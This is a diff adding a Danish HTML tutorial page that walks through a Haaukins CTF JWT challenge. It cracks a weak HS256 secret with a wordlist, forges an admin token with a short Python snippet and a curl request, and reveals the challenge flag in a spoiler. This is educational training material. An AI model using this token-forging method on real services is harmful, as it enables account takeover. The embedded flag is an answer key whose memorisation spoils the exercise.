@@ -1,0 +1,40 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: JWT — tutorial (knæk HS256-secret &amp; forge admin)</title>
+<meta name="description" content="Guide til Haaukins JWT: knæk JWT&#x27;ens svage HS256-secret med rockyou og forfalsk et admin-token.">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>JWT</h1>
+<p class="subtitle">Knæk en svag HS256-secret og forfalsk admin-claims.</p>
+<div class="badges"><span class="badge cat">Web exploitation</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+
+<h2>Hvad går opgaven ud på?</h2>
+<p>Login sætter en <code>jwt</code>-cookie med <code>{"user":"guest"}</code> (HS256). Hintet
+             ("JohnTheRipper") = knæk secret'en med en wordlist, så kan du forge vilkårlige claims.</p>
+<h2>Trin for trin</h2>
+<pre><code># knæk secret (HMAC-SHA256 over header.payload, sammenlign med signaturen) -> 'challenge'
+# forge {"user":"admin"} signeret med den:
+h=b64u(b'{"alg":"HS256","typ":"JWT"}'); p=b64u(b'{"user":"admin"}')
+tok=f"{h}.{p}."+b64u(hmac.new(b'challenge',(h+'.'+p).encode(),hashlib.sha256).digest())
+curl -b "jwt=$tok" http://jwt.com/user</code></pre>
+             <p>Genberegn med <em>samme</em> serialisering (ingen mellemrum). Alternativt <code>hashcat -m 16500</code>
+             eller <code>jwt_tool</code>.</p>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Flag: <span class="flag">HKN{Pi5-JHo-VT2Z}</span></p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li>JWT HS256: hele sikkerheden er secret'en; svag secret → forge vilkårlige claims.</li><li>Signaturen dækker <code>base64url(header).base64url(payload)</code> — samme serialisering.</li><li>Beslægtet: <a href="fartcorp.html">FartCorp</a> (lækket secret) og <a href="serializator.html">Serializator</a>.</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
